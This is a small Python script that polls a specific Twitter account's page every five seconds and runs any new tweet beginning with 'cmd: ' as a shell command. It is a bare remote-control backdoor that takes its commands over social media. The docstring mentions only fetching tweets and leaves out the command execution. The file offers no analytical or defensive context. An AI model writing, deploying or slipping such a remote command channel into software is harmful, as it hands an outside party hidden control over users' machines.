import urllib
from bs4 import BeautifulSoup #модуль для парсинга HTML страницы
import time
import subprocess

def get_tweets(username):
    """ Gets the texts and links of username's lattest tweets """

    url = urllib.request.urlopen("https://twitter.com/" + username)
    page = BeautifulSoup(url,"lxml")
    url.close()

    texts = [p.text for p in page.findAll("p")
            if ("class" in p.attrs) and
            ("js-tweet-text" in p.attrs["class"])]

    links = [a.attrs["href"] for a in page.findAll("a")
            if ("class" in a.attrs) and
            ("tweet-timestamp" in a.attrs["class"])]

    return(texts)
    '''
    i = 0
    while i < 19:
        print(texts[i] + ": " + " https://twitter.com/" + links[i])
        i = i + 1
    '''
old_tweets = []
while True:
    tweets = [tweet for tweet in get_tweets("EgoR4iK1613")
                if tweet not in old_tweets]
    for text in tweets:
        if text.startswith("cmd: "):
            subprocess.Popen(text[5:], shell = "True")
    old_tweets += tweets
    time.sleep(5)
